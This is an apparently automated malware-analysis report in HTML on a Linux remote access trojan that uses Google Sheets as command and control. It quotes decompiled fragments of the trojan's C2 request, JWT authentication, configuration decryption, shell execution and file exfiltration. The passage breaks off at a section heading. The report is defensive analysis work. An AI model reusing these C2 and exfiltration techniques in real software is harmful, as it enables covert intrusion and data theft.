@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malware Analysis Report - kworofd</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Roboto+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #1f2937; --accent: #b91c1c; --border: #e5e7eb; }
+        body { font-family: 'Roboto', sans-serif; background-color: #f3f4f6; color: #111827; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+        .page-container { width: 210mm; min-height: 297mm; padding: 20mm; margin: 20px auto; background: white; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); position: relative; }
+        .font-mono { font-family: 'Roboto Mono', monospace; }
+        h2.section-header { font-size: 14pt; font-weight: 700; text-transform: uppercase; color: var(--primary); border-bottom: 1px solid #9ca3af; padding-bottom: 4px; margin-top: 32px; margin-bottom: 16px; display: flex; align-items: center; }
+        h2.section-header::before { content: ''; display: inline-block; width: 6px; height: 18px; background-color: var(--accent); margin-right: 12px; }
+        .meta-box { border: 1px solid #d1d5db; background-color: #f9fafb; padding: 12px; font-size: 0.9rem; display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 32px; }
+        .meta-label { font-weight: 600; color: #4b5563; text-transform: uppercase; font-size: 0.75rem; }
+        .risk-banner { text-align: center; padding: 6px; font-weight: bold; text-transform: uppercase; font-size: 0.9rem; letter-spacing: 0.1em; margin-bottom: 20px; border: 1px solid; }
+        .risk-critical { background-color: #fee2e2; color: #991b1b; border-color: #fca5a5; }
+        .risk-high { background-color: #ffedd5; color: #9a3412; border-color: #fdba74; }
+        .risk-medium { background-color: #fef9c3; color: #854d0e; border-color: #fde047; }
+        .risk-low { background-color: #dcfce7; color: #166534; border-color: #86efac; }
+        .risk-clean { background-color: #f3f4f6; color: #374151; border-color: #d1d5db; }
+        .markdown-content p { margin-bottom: 12px; line-height: 1.6; font-size: 10.5pt; }
+        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 12px; }
+        .markdown-content li { margin-bottom: 6px; }
+        .markdown-content pre { background-color: #f3f4f6; border: 1px solid #d1d5db; border-left: 4px solid #6b7280; padding: 12px; overflow-x: auto; font-size: 0.85rem; margin: 16px 0; }
+        .markdown-content code { font-family: 'Roboto Mono', monospace; background-color: #f3f4f6; padding: 2px 4px; font-size: 0.9em; color: #b91c1c; }
+        .markdown-content pre code { color: #374151; background: none; padding: 0; }
+        .markdown-content h3 { font-size: 1.1rem; font-weight: 700; color: #1f2937; margin-top: 1.5rem; margin-bottom: 0.75rem; border-bottom: 1px dotted #d1d5db; padding-bottom: 4px; }
+        .markdown-content h4 { font-size: 1rem; font-weight: 600; color: #374151; margin-top: 1.25rem; margin-bottom: 0.5rem; }
+        .markdown-content table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 0.9rem; border: 1px solid #d1d5db; }
+        .markdown-content th { background-color: #e5e7eb; font-weight: 700; text-transform: uppercase; font-size: 0.75rem; color: #374151; padding: 8px 12px; text-align: left; border-bottom: 2px solid #9ca3af; }
+        .markdown-content td { padding: 8px 12px; border-bottom: 1px solid #e5e7eb; color: #1f2937; }
+        .finding-item { margin-bottom: 16px; border-bottom: 1px dashed #d1d5db; padding-bottom: 12px; }
+        .finding-title { font-weight: 700; color: #1f2937; font-size: 1rem; margin-bottom: 4px; }
+        .finding-desc { color: #4b5563; }
+        /* Utility classes used by markdown renderer */
+        .w-full { width: 100%; }
+        .text-left { text-align: left; }
+        .text-sm { font-size: 0.875rem; line-height: 1.25rem; }
+        .text-xs { font-size: 0.75rem; line-height: 1rem; }
+        .text-gray-500 { color: #6b7280; }
+        .text-gray-600 { color: #4b5563; }
+        .text-gray-800 { color: #1f2937; }
+        .italic { font-style: italic; }
+        .font-bold { font-weight: 700; }
+        .break-all { word-break: break-all; }
+        .list-disc { list-style-type: disc; }
+        .pl-4 { padding-left: 1rem; }
+        .pl-6 { padding-left: 1.5rem; }
+        .pt-half { padding-top: 0.125rem; }
+        .pb-4 { padding-bottom: 1rem; }
+        .mb-2 { margin-bottom: 0.5rem; }
+        .mb-3 { margin-bottom: 0.75rem; }
+        .mb-4 { margin-bottom: 1rem; }
+        .gap-4 { gap: 1rem; }
+        .items-start { align-items: flex-start; }
+        .flex { display: flex; }
+        .flex-shrink-0 { flex-shrink: 0; }
+        .space-y-4 > * + * { margin-top: 1rem; }
+        .border-b { border-bottom: 1px solid #e5e7eb; }
+        .border-dashed { border-style: dashed; }
+        .border-gray-200 { border-color: #e5e7eb; }
+
+        .leading-relaxed { line-height: 1.625; }
+        .uppercase { text-transform: uppercase; }
+        .border-l-2 { border-left: 2px solid; }
+        .border-gray-300 { border-color: #d1d5db; }
+        .pl-3 { padding-left: 0.75rem; }
+        .border-collapse { border-collapse: collapse; }
+        @media print { body { background: white; } .page-container { margin: 0; padding: 15mm; box-shadow: none; width: 100%; } .no-print { display: none !important; } }
+    </style>
+</head>
+<body>
+    <div class="no-print" style="position: fixed; bottom: 32px; right: 32px; z-index: 50;">
+        <button onclick="window.print()" style="background: #1f2937; color: white; padding: 12px 24px; border: none; cursor: pointer; font-weight: 500; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.2);">
+            Print / Save PDF
+        </button>
+    </div>
+
+    <div class="page-container">
+        <!-- Header -->
+        <div style="display: flex; justify-content: space-between; align-items: flex-end; margin-bottom: 8px; border-bottom: 2px solid #1f2937; padding-bottom: 16px;">
+            <div>
+                <div style="font-size: 12px; font-weight: bold; color: #6b7280; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 4px;">Confidential & Proprietary</div>
+                <h1 style="font-size: 30px; font-weight: bold; color: #111827; text-transform: uppercase; letter-spacing: 0.05em; margin: 0;">Reverse Engineering Report</h1>
+            </div>
+            <div style="text-align: right;">
+                <div style="font-weight: bold; color: #111827;">CYBER SECURITY DIVISION</div>
+                <div style="font-size: 14px; color: #6b7280;">Incident Response Team</div>
+            </div>
+        </div>
+
+        <!-- Metadata -->
+        <div class="meta-box">
+            <div>
+                <div class="meta-label">File Name</div>
+                <div class="font-mono">kworofd</div>
+            </div>
+            <div style="text-align: right;">
+                <div class="meta-label" style="text-align: right;">Analysis ID</div>
+                <div class="font-mono">dc2e7b68</div>
+            </div>
+            <div>
+                <div class="meta-label">Date Generated</div>
+                <div>2026-02-26 05:15 UTC</div>
+            </div>
+            <div style="text-align: right;">
+                <div class="meta-label" style="text-align: right;">Classification</div>
+                <div style="display: inline-block; background: black; color: #FFC000; padding: 2px 8px; font-size: 12px; font-weight: bold;">TLP:AMBER</div>
+            </div>
+        </div>
+
+        <!-- Risk Banner -->
+        <div class="risk-banner risk-critical">
+            THREAT ASSESSMENT: MALWARE
+        </div>
+
+        
+        <!-- Executive Summary -->
+        <div>
+            <h2 class="section-header">1. Executive Summary</h2>
+            <div class="markdown-content"><p class="mb-3">The analyzed binary is a 64-bit Linux ELF executable that functions as a remote access trojan (RAT) utilizing the Google Sheets API as its Command and Control (C2) infrastructure. The malware statically links OpenSSL to handle HTTPS communications and cryptographic operations. It authenticates with Google APIs using a Service Account via JSON Web Token (JWT) signed with RS256. The configuration—including the Spreadsheet ID, OAuth Client Email, and RSA Private Key—is stored in an encrypted format within the binary and decrypted using AES-128-CBC, where the decryption key is derived from the first 16 bytes of the binary file itself (or a specified config file).</p>
+
+<p class="mb-3">The malware performs system reconnaissance, gathering information such as hostname, IP addresses, OS version, and user details. It communicates with Google Sheets to retrieve commands in a specific format (e.g., <code>S-C-R-&lt;command&gt;-&lt;args&gt;</code>) and uploads execution results or file contents back to the spreadsheet. Capabilities include arbitrary shell command execution, file exfiltration, and file download/writing. By abusing legitimate Google API domains, the malware evades traditional network-based detection mechanisms that block suspicious IP addresses.</p>
+
+<strong>Verdict: Malware</strong></div>
+        </div>
+
+        <!-- Malware Capabilities -->
+        <div>
+            <h2 class="section-header">2. Malware Capabilities</h2>
+            <div class="text-sm text-gray-600 mb-4 italic border-l-2 border-gray-300 pl-3">Identified capabilities and behaviors exhibited by this malware sample.</div>
+            <div class="markdown-content"><ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>C2 Communication via Google Sheets</strong>: Uses the Google Sheets API (<code>sheets.googleapis.com</code>) to send and receive commands and data, bypassing traditional IP firewalls.</li>
+<li class="mb-2"><strong>Evidence</strong>: <code>fcn.004094b0</code> @ <code>0x4094b0</code> — <code>snprintf(rsp, 0x1000, &quot;POST /v4/spreadsheets/%s/values:batchClear HTTP/1.1\r\nHost: sheets.googleapis.com...</code></li>
+<li class="mb-2"><strong>Decryption of Embedded Configuration</strong>: Decrypts hardcoded configuration (Spreadsheet ID, Credentials) using AES-128-CBC.</li>
+<li class="mb-2"><strong>Evidence</strong>: <code>fcn.00408190</code> @ <code>0x408190</code> — <code>AES_cbc_encrypt();</code></li>
+<li class="mb-2"><strong>OAuth2/JWT Authentication</strong>: Generates signed JWTs to authenticate with Google APIs using a statically linked OpenSSL crypto library.</li>
+<li class="mb-2"><strong>Evidence</strong>: <code>fcn.00408960</code> @ <code>0x408960</code> — <code>snprintf(..., &quot;{\&quot;alg\&quot;:\&quot;RS256\&quot;,\&quot;kid\&quot;:\&quot;%s\&quot;,\&quot;typ\&quot;:\&quot;JWT\&quot;}&quot;, ...</code></li>
+<li class="mb-2"><strong>System Reconnaissance</strong>: Gathers detailed system information including hostname, network interfaces, OS details, and current user.</li>
+<li class="mb-2"><strong>Evidence</strong>: <code>fcn.00408b20</code> @ <code>0x408b20</code> — <code>eax = gethostname();</code> ... <code>eax = getifaddrs();</code> ... <code>eax = uname();</code></li>
+<li class="mb-2"><strong>Arbitrary Shell Command Execution</strong>: Executes shell commands on the infected host using <code>popen</code>.</li>
+<li class="mb-2"><strong>Evidence</strong>: <code>fcn.00407310</code> @ <code>0x407310</code> — <code>rax = popen (rbx, 0x4f6333);</code></li>
+<li class="mb-2"><strong>File Exfiltration</strong>: Reads local files and uploads their contents to the C2 server.</li>
+<li class="mb-2"><strong>Evidence</strong>: <code>fcn.00409110</code> @ <code>0x409110</code> (Called in <code>main</code> for <code>S-D</code> command) — Uses <code>fopen</code>, <code>fread</code>, and Base64 encoding to prepare file data for transmission.</li>
+<li class="mb-2"><strong>File Download/Writing</strong>: Writes arbitrary data to the local file system.</li>
+<li class="mb-2"><strong>Evidence</strong>: <code>main</code> @ <code>0x4095c0</code> — <code>rax = fwrite (*((rsp + 0x768)), 1, *((rsp + 0x760)), rax);</code></li>
+<li class="mb-2"><strong>Polling with Jitter</strong>: Implements a polling mechanism with randomized sleep intervals to blend in with normal traffic patterns.</li>
+<li class="mb-2"><strong>Evidence</strong>: <code>main</code> @ <code>0x4095c0</code> — <code>eax = rand ();</code> ... <code>eax = sleep (rsi + 0x12c);</code></li>
+</ul></div>
+        </div>
+
+        <!-- Binary Information -->
+        <div>
+            <h2 class="section-header">3. Binary Information</h2>
+            <div class="markdown-content"><table class="w-full text-left border-collapse"><tr><th>Property</th><th>Value</th></tr><tr><td>SHA256</td><td>fd043489720558128f03b9b42e4a85eb1b6b9ea61023bd64ada94b2b20de198c</td></tr><tr><td>Architecture</td><td>x86</td></tr><tr><td>Type</td><td>ELF/PE (inferred)</td></tr><tr><td>Image Base</td><td>00400000</td></tr><tr><td>Entry Point</td><td>0074a600, 0074abc0, 0074dc40, 0047d080, 00748760, 0074e440, 0041c6b0, 0046a9d0, 0046b160, 00767698, 0074e1c0, 0074e380, 0047fbd0, 0074a980, 0043e2d0, 0074df00, 0074bee0, 0074ae80, 0074e740, 0074b140, 0074bd60, 0046c340, 0074bb80, 00485830, 00483200, 0043f110, 0074dfc0, 00490df0, 0074ad80, 0074c160, 004c18e0, 0074d460, 00486610, 00748660, 0074bd20, 0046c1d0, 004ac750, 0044dcc0, 004d9710, 0074cfe0, 0074b480, 0074b580, 00750e80, 0074a840, 004cf0a0, 004a1b00, 00759be0, 004a1d50, 0074a9c0, 00765b68, 0074b4c0, 0074aa80, 0074a480, 0074c2e0, 00451e00, 0074dc00, 0074b6c0, 004a1be0, 0074e080, 00437e90, 0074ac00, 0074c120, 0044dcd0, 00748860, 0044d680, 0046aee0, 0074b9c0, 00472fb0, 0074cf60, 0074b340, 00485820, 007486a0, 0075e540, 0045fdc0, 0074c3e0, 004069f0, 0074be60, 0074e4c0, 004a71f0, 004ad920, 0074b600, 0074bf20, 0049dce0, 0044dbf0, 0074a780, 004ad280, 0074bce0, 0046b150, 0074ddc0, 00488d40, 0074aa00, 0074c320, 004dea30, 00406ab0, 0074c0a0, 0049dcc0, 004a2e30, 0049fc30, 0074b500, 004dea20, 0074acc0, 0046b850, 0074c2a0, 00446960, 0074ad40, 0046cad0, 0074b0c0, 0043f680, 00423580, 0046b7e0, 00447490, 0049f8d0, 0074e280, 0074e5c0, 0074afc0, 0074c220, 00748a80, 0074dd40, 0074ae00, 004a3640, 0074bca0, 004cf080, 0074e480, 0046af90, 0047cee0, 0074b3c0, 004a0ec0, 0046c550, 004cf980, 004c3a70, 0046ae40, 0074c3a0, 0074b380, 00483320, 0074d5a0, 0074b080, 0074bda0, 0074aa40, 0074be20, 004cfba0, 0074c260, 0074dcc0, 0074b040, 0074d560, 0074a7c0, 0074a4c0, 004717d0, 004ad900, 00472fa0, 004adf80, 0042c870, 00469120, 00406e10, 0074b000, 0074e640, 007487e0, 0074b100, 00472f90, 0044d6c0, 0074ba80, 0075e5a0, 0044d6b0, 0048cb10, 0074ac40, 004ac640, 0074e040, 004b3f40, 0074a880, 0074d6e0, 0074b180, 0074bea0, 0074a940, 0048a860, 00458800, 0074e140, 007487a0, 004ad1b0, 0074d4a0, 0074bb40, 0074b680, 004cfa10, 0046c240, 0074a900, 0047cd10, 0048ca70, 0041d780, 00438c90, 004831f0, 0074ad00, 0074c0e0, 0074b440, 0046b0b0, 0074e180, 0044d670, 0074b5c0, 004832e0, 0074ba00, 00412b40, 00763e88, 0074d520, 00767690, 0074bde0, 00488560, 0046b170, 0074bac0, 00748620, 0074e500, 004b3f60, 0074c1a0, 004a0410, 0074e3c0, 004cfb90, 004a26b0, 00446ef0, 0074bf60, 0046c250, 0046c570, 0046c210, 0074a580, 004a81a0, 0074ab80, 0046ade0, 007485e0, 004cfa40, 0049f420, 0074c1e0, 00424180, 0074ab40, 0074ab00, 0074e600, 004cfb80, 0074d660, 0044dc00, 007631e0, 0074de80, 004ae0a0, 00471b30, 0074bb00, 00413580, 004a0e80, 0074c360, 0046b190, 0074ae40, 0074e300, 0074b740, 0074d3e0, 0074b700, 0074b8c0, 004c3b10, 0074dd00, 0046b020, 0049dca0, 004cf9e0, 0074b900, 0074b540, 0074b400, 0044ceb0, 00470e40, 0074a740, 0074a500, 0074e240, 0074c420, 0074dd80, 00480f00, 0043ee20, 00763420, 0074dc80, 0074ac80, 00406f00, 00406880, 004f4718</td></tr><tr><td>Compiler</td><td>ghidra.program.database.ProgramCompilerSpec@59253557</td></tr><tr><td>Ghidra Imports</td><td>&lt;EXTERNAL&gt;::tcsetattr, &lt;EXTERNAL&gt;::fileno, &lt;EXTERNAL&gt;::printf, &lt;EXTERNAL&gt;::memset, &lt;EXTERNAL&gt;::ftell, &lt;EXTERNAL&gt;::snprintf, &lt;EXTERNAL&gt;::shutdown, &lt;EXTERNAL&gt;::close, &lt;EXTERNAL&gt;::ioctl, &lt;EXTERNAL&gt;::abort, &lt;EXTERNAL&gt;::memchr, &lt;EXTERNAL&gt;::gethostbyname, &lt;EXTERNAL&gt;::uname, &lt;EXTERNAL&gt;::fseek, &lt;EXTERNAL&gt;::exit, &lt;EXTERNAL&gt;::__assert_fail, &lt;EXTERNAL&gt;::strcasecmp, &lt;EXTERNAL&gt;::gettimeofday, &lt;EXTERNAL&gt;::read, &lt;EXTERNAL&gt;::strncmp, &lt;EXTERNAL&gt;::fopen, &lt;EXTERNAL&gt;::__libc_start_main, &lt;EXTERNAL&gt;::gmtime, &lt;EXTERNAL&gt;::setsockopt, &lt;EXTERNAL&gt;::getpid, &lt;EXTERNAL&gt;::fgets, &lt;EXTERNAL&gt;::getpwuid, &lt;EXTERNAL&gt;::vfprintf, &lt;EXTERNAL&gt;::__strtoul_internal, &lt;EXTERNAL&gt;::__strdup, &lt;EXTERNAL&gt;::fputc, &lt;EXTERNAL&gt;::strlen, &lt;EXTERNAL&gt;::ferror, &lt;EXTERNAL&gt;::opendir, &lt;EXTERNAL&gt;::__xstat, &lt;EXTERNAL&gt;::pclose, &lt;EXTERNAL&gt;::listen, &lt;EXTERNAL&gt;::__ctype_b_loc, &lt;EXTERNAL&gt;::readdir, &lt;EXTERNAL&gt;::sprintf, &lt;EXTERNAL&gt;::__strtol_internal, &lt;EXTERNAL&gt;::strrchr, &lt;EXTERNAL&gt;::sscanf, &lt;EXTERNAL&gt;::sleep, &lt;EXTERNAL&gt;::poll, &lt;EXTERNAL&gt;::strerror, &lt;EXTERNAL&gt;::strstr, &lt;EXTERNAL&gt;::sigaction, &lt;EXTERNAL&gt;::getifaddrs, &lt;EXTERNAL&gt;::strcat, &lt;EXTERNAL&gt;::getsockopt, &lt;EXTERNAL&gt;::fputs, &lt;EXTERNAL&gt;::readlink, &lt;EXTERNAL&gt;::connect, &lt;EXTERNAL&gt;::gethostname, &lt;EXTERNAL&gt;::tcgetattr, &lt;EXTERNAL&gt;::memcpy, &lt;EXTERNAL&gt;::signal, &lt;EXTERNAL&gt;::memmove, &lt;EXTERNAL&gt;::strchr, &lt;EXTERNAL&gt;::socket, &lt;EXTERNAL&gt;::fread, &lt;EXTERNAL&gt;::__fxstat, &lt;EXTERNAL&gt;::getenv, &lt;EXTERNAL&gt;::__errno_location, &lt;EXTERNAL&gt;::qsort, &lt;EXTERNAL&gt;::strncasecmp, &lt;EXTERNAL&gt;::getnameinfo, &lt;EXTERNAL&gt;::strcmp, &lt;EXTERNAL&gt;::getcwd, &lt;EXTERNAL&gt;::strcpy, &lt;EXTERNAL&gt;::strtok, &lt;EXTERNAL&gt;::freeifaddrs, &lt;EXTERNAL&gt;::srand, &lt;EXTERNAL&gt;::getuid, &lt;EXTERNAL&gt;::__ctype_tolower_loc, &lt;EXTERNAL&gt;::calloc, &lt;EXTERNAL&gt;::feof, &lt;EXTERNAL&gt;::fclose, &lt;EXTERNAL&gt;::strncpy, &lt;EXTERNAL&gt;::closedir, &lt;EXTERNAL&gt;::fopen64, &lt;EXTERNAL&gt;::bind, &lt;EXTERNAL&gt;::fwrite, &lt;EXTERNAL&gt;::perror, &lt;EXTERNAL&gt;::rand, &lt;EXTERNAL&gt;::fprintf, &lt;EXTERNAL&gt;::localtime, &lt;EXTERNAL&gt;::write, &lt;EXTERNAL&gt;::strftime, &lt;EXTERNAL&gt;::accept, &lt;EXTERNAL&gt;::popen, &lt;EXTERNAL&gt;::open, &lt;EXTERNAL&gt;::time, &lt;EXTERNAL&gt;::fflush, &lt;EXTERNAL&gt;::getservbyname, &lt;EXTERNAL&gt;::malloc, &lt;EXTERNAL&gt;::free, &lt;EXTERNAL&gt;::realloc, &lt;EXTERNAL&gt;::__gmon_start__</td></tr><tr><td>Ghidra Exports</td><td>X509_ATTRIBUTE_it, ASN1_IA5STRING_it, EXTENDED_KEY_USAGE_it, X509_STORE_get1_certs, DSA_SIG_it, CMS_RecipientInfo_it, d2i_SSL_SESSION, X509_ALGOR_free, i2d_X509_SIG, sigx_app, CMS_RecipientKeyIdentifier_it, CMS_KEKRecipientInfo_it, X509_VERIFY_PARAM_free, ASN1_INTEGER_it, MD5_Transform, CMS_CertificateChoices_it, PKCS7_DIGEST_it, DIRECTORYSTRING_it, CMS_SharedInfo_it, PBKDF2PARAM_it, PKCS7_ISSUER_AND_SERIAL_it, i2d_X509_AUX, PROXY_CERT_INFO_EXTENSION_it, POLICYINFO_free, GENERAL_NAME_free, SHA256_Transform, CMS_SignerInfo_it, OCSP_RESPID_free, ASN1_ANY_it, OCSP_REQINFO_it, DSA_new, X509_REQ_INFO_it, DIST_POINT_free, RSA_PSS_PARAMS_it, PKCS7_SIGNER_INFO_it, X509_free, gcm_ghash_4bit, d2i_DSAparams, policy_node_free, DHxparams_it, SXNETID_it, POLICYQUALINFO_it, X509_NAME_it, X509_CINF_it, d2i_X509_REQ, aesni_ccm64_encrypt_blocks, ssl3_ciphers, aesni_ctr32_encrypt_blocks, ASN1_ENUMERATED_it, app_pkey_methods, SXNET_it, ASN1_NULL_it, X509_ALGOR_it, OCSP_CERTSTATUS_it, BIO_vfree, BASIC_CONSTRAINTS_it, DIST_POINT_it, aesni_ccm64_decrypt_blocks, CMS_SignedData_it, ssl3_accept, ASN1_GENERALSTRING_it, OCSP_ONEREQ_it, d2i_DSAPrivateKey, DSAPublicKey_it, i2d_RSAPrivateKey, i2d_RSA_PUBKEY, AUTHORITY_KEYID_it, d2i_PKCS8_PRIV_KEY_INFO, DHparams_it, OTHERNAME_it, POLICYQUALINFO_free, RSA_OAEP_PARAMS_it, x509_file_lookup, EVP_PKEY_new, OCSP_CRLID_it, &lt;EXTERNAL&gt;::malloc, PKCS7_SIGN_ENVELOPE_it, CMS_DigestedData_it, SEED_encrypt, gcm_ghash_avx, NOTICEREF_it, PKCS7_ATTR_SIGN_it, vpaes_cbc_encrypt, i2d_DSAparams, X509_NAME_ENTRIES_it, gcm_ghash_clmul, PKCS7_SIGNED_it, X509_SIG_new, PKCS12_AUTHSAFES_it, POLICY_MAPPING_free, ASN1_BIT_STRING_it, OCSP_SINGLERESP_it, d2i_CMS_ContentInfo, &lt;EXTERNAL&gt;::free, OCSP_SIGNATURE_it, vpaes_decrypt, aesni_xts_decrypt, bsaes_xts_encrypt, CERTIFICATEPOLICIES_it, i2d_CMS_ContentInfo, ASN1_VISIBLESTRING_it, X509_NAME_ENTRY_free, OCSP_REVOKEDINFO_it, AES_encrypt, ASN1_BMPSTRING_it, d2i_AutoPrivateKey, PBEPARAM_it, SHA512_Transform, ssl3_connect, X509_NAME_free, AES_cbc_encrypt, bsaes_ctr32_encrypt_blocks, CMS_OriginatorPublicKey_it, CMS_ContentInfo_it, ASN1_SEQUENCE_ANY_it, OCSP_RESPONSE_it, dhx_asn1_meth, PKCS12_SAFEBAG_it, ASN1_PRINTABLE_it, aesni_cbc_encrypt, PKCS7_it, i2d_X509_REQ, CMS_EnvelopedData_it, d2i_PUBKEY, X509_STORE_get1_crls, GENERAL_NAME_it, aesni_decrypt, i2d_X509_CERT_PAIR, X509_CRL_free, i2d_DHxparams, i2d_DSA_PUBKEY, OCSP_BASICRESP_it, EDIPARTYNAME_it, d2i_GENERAL_NAME, X509_CRL_it, X509_EXTENSIONS_it, PKCS7_ENVELOPE_it, ASN1_OCTET_STRING_it, PKCS7_ENC_CONTENT_it, i2d_PrivateKey, OCSP_RESPID_it, PKCS12_MAC_DATA_it, X509_EXTENSION_it, X509_CRL_INFO_it, X509_NAME_INTERNAL_it, X509_ALGORS_it, X509_EXTENSION_free, gcm_gmult_avx, i2d_PKCS8_PRIV_KEY_INFO, BN_sub, dtls1_connect, ASN1_OBJECT_free, &lt;EXTERNAL&gt;::realloc, ASN1_SET_ANY_it, CMS_Attributes_Verify_it, DSAparams_it, PBE2PARAM_it, PKCS8_PRIV_KEY_INFO_new, d2i_RSAPrivateKey, POLICY_CONSTRAINTS_it, x509_dir_lookup, d2i_RSAPublicKey, d2i_PKCS7, ASN1_UTCTIME_it, gcm_gmult_4bit, CMS_RevocationInfoChoice_it, BN_pseudo_rand, X509_it, NETSCAPE_CERT_SEQUENCE_it, PKCS8_PRIV_KEY_INFO_it, PKCS7_ENCRYPT_it, X509_CERT_PAIR_it, policy_data_free, lh_strhash, CMS_KeyTransRecipientInfo_it, DSAPrivateKey_it, gcm_gmult_clmul, X509_REQ_it, PROXY_POLICY_it, DIST_POINT_NAME_it, d2i_X509_CRL, d2i_X509, X509_CERT_AUX_it, X509_STORE_CTX_get1_issuer, i2d_PKCS7, i2d_SSL_SESSION, dtls1_accept, GENERAL_NAMES_free, ASN1_UNIVERSALSTRING_it, OCSP_CERTID_it, PKEY_USAGE_PERIOD_it, d2i_RSA_PUBKEY, CMS_OtherKeyAttribute_it, i2d_RSAPublicKey, USERNOTICE_it, i2d_GENERAL_NAME, POLICY_MAPPING_it, ssl_cipher_ptr_id_cmp, obj_cleanup_defer, X509_REVOKED_it</td></tr><tr><td>Functions (Ghidra)</td><td>4217 total (40 decompiled)</td></tr><tr><td>Functions (R2)</td><td>2066 total (40 decompiled)</td></tr><tr><td>R2 Architecture</td><td>x86 (64-bit)</td></tr><tr><td>R2 OS</td><td>linux</td></tr><tr><td>R2 Imports</td><td>tcsetattr, fileno, printf, memset, ftell, snprintf, shutdown, close, ioctl, abort, memchr, gethostbyname, __gmon_start__, uname, fseek, exit, __assert_fail, strcasecmp, gettimeofday, read, strncmp, fopen, __libc_start_main, gmtime, setsockopt, getpid, fgets, getpwuid, vfprintf, __strtoul_internal, __strdup, fputc, strlen, ferror, opendir, __xstat, pclose, listen, __ctype_b_loc, readdir, sprintf, stdin, __strtol_internal, strrchr, sscanf, sleep, poll, strerror, strstr, sigaction, getifaddrs, strcat, getsockopt, fputs, readlink, connect, gethostname, tcgetattr, memcpy, signal, memmove, strchr, socket, fread, __fxstat, getenv, __errno_location, qsort, strncasecmp, getnameinfo, strcmp, getcwd, strcpy, strtok, freeifaddrs, srand, getuid, __ctype_tolower_loc, calloc, feof, fclose, strncpy, closedir, stderr, fopen64, bind, fwrite, perror, rand, fprintf, localtime, write, strftime, accept, popen, open, time, fflush, getservbyname, malloc</td></tr><tr><td>R2 Exports</td><td>X509_ATTRIBUTE_it, ASN1_IA5STRING_it, EXTENDED_KEY_USAGE_it, X509_STORE_get1_certs, DSA_SIG_it, CMS_RecipientInfo_it, d2i_SSL_SESSION, X509_ALGOR_free, i2d_X509_SIG, sigx_app, CMS_RecipientKeyIdentifier_it, CMS_KEKRecipientInfo_it, X509_VERIFY_PARAM_free, ASN1_INTEGER_it, MD5_Transform, CMS_CertificateChoices_it, PKCS7_DIGEST_it, DIRECTORYSTRING_it, CMS_SharedInfo_it, PBKDF2PARAM_it, PKCS7_ISSUER_AND_SERIAL_it, i2d_X509_AUX, PROXY_CERT_INFO_EXTENSION_it, POLICYINFO_free, GENERAL_NAME_free, SHA256_Transform, CMS_SignerInfo_it, OCSP_RESPID_free, ASN1_ANY_it, OCSP_REQINFO_it, DSA_new, X509_REQ_INFO_it, DIST_POINT_free, RSA_PSS_PARAMS_it, PKCS7_SIGNER_INFO_it, X509_free, gcm_ghash_4bit, d2i_DSAparams, policy_node_free, DHxparams_it, SXNETID_it, POLICYQUALINFO_it, X509_NAME_it, X509_CINF_it, d2i_X509_REQ, aesni_ccm64_encrypt_blocks, ssl3_ciphers, aesni_ctr32_encrypt_blocks, ASN1_ENUMERATED_it, app_pkey_methods, SXNET_it, ASN1_NULL_it, X509_ALGOR_it, OCSP_CERTSTATUS_it, BIO_vfree, BASIC_CONSTRAINTS_it, DIST_POINT_it, aesni_ccm64_decrypt_blocks, CMS_SignedData_it, ssl3_accept, ASN1_GENERALSTRING_it, OCSP_ONEREQ_it, d2i_DSAPrivateKey, DSAPublicKey_it, i2d_RSAPrivateKey, i2d_RSA_PUBKEY, AUTHORITY_KEYID_it, d2i_PKCS8_PRIV_KEY_INFO, DHparams_it, OTHERNAME_it, POLICYQUALINFO_free, RSA_OAEP_PARAMS_it, x509_file_lookup, EVP_PKEY_new, OCSP_CRLID_it, PKCS7_SIGN_ENVELOPE_it, CMS_DigestedData_it, SEED_encrypt, gcm_ghash_avx, NOTICEREF_it, PKCS7_ATTR_SIGN_it, vpaes_cbc_encrypt, i2d_DSAparams, X509_NAME_ENTRIES_it, gcm_ghash_clmul, PKCS7_SIGNED_it, X509_SIG_new, PKCS12_AUTHSAFES_it, POLICY_MAPPING_free, ASN1_BIT_STRING_it, OCSP_SINGLERESP_it, d2i_CMS_ContentInfo, OCSP_SIGNATURE_it, vpaes_decrypt, aesni_xts_decrypt, bsaes_xts_encrypt, CERTIFICATEPOLICIES_it, i2d_CMS_ContentInfo, ASN1_VISIBLESTRING_it, X509_NAME_ENTRY_free</td></tr><tr><td>Strings (Ghidra)</td><td>5852 extracted</td></tr><tr><td>Strings (R2)</td><td>5215 extracted</td></tr></table></div>
+        </div>
+
+        <!-- Technical Analysis -->
+        <div>
+            <h2 class="section-header">4. Technical Analysis</h2>
+            <div class="text-sm text-gray-600 mb-4 italic border-l-2 border-gray-300 pl-3">In-depth technical examination of the malware code structure, algorithms, and implementation details.</div>
+            <div class="markdown-content"><strong>Configuration Decryption</strong>
+<p class="mb-3">The malware contains a function responsible for extracting its configuration. It reads the first 16 bytes of the executable (passed as an argument or derived from <code>/proc/self/exe</code>) to use as an AES key and IV. It then decrypts several large hardcoded Base64-like strings stored in the <code>.data</code> or <code>.rodata</code> sections to reveal the Spreadsheet ID, Client Email, and RSA Private Key required for C2 communication.</p>
+
+<strong>Code Evidence</strong> (<code>fcn.00408190</code> @ <code>0x408190</code>):
+<pre><code>// Reads the file itself (or config) to get the AES key/IV
+rax = fopen (rbx, 0x4f479d); // &quot;rb&quot;
+rbp = rsp + 0x1110;
+rax = fread (rbp, 1, 0x10, rax); // Read 16 bytes into rbp
+// ...
+// Decrypts hardcoded encrypted strings using AES-CBC
+AES_cbc_encrypt();
+</code></pre>
+
+<strong>C2 Authentication (OAuth2/JWT)</strong>
